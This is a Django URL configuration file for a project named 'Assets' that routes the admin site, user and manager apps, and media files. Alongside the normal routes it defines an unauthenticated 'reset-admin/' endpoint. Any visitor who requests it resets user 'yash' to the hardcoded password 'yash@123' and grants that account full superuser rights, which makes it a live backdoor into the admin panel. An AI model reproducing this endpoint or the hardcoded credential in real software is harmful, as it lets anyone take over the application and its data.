"""
URL configuration for Assets project.

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/6.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static

from django.contrib.auth import get_user_model
from django.http import HttpResponse


def reset_admin(request):
    User = get_user_model()
    user = User.objects.get(username="yash")
    user.set_password("yash@123")
    user.is_staff = True
    user.is_superuser = True
    user.is_active = True
    user.save()

    return HttpResponse("Yash is now the main superuser.")




urlpatterns = [
    path('superuser/', admin.site.urls),

    path("reset-admin/", reset_admin),

    # User App
    path('', include('user.urls')),

    # Manager App
    path('admin/', include('manager.urls')),
]

urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)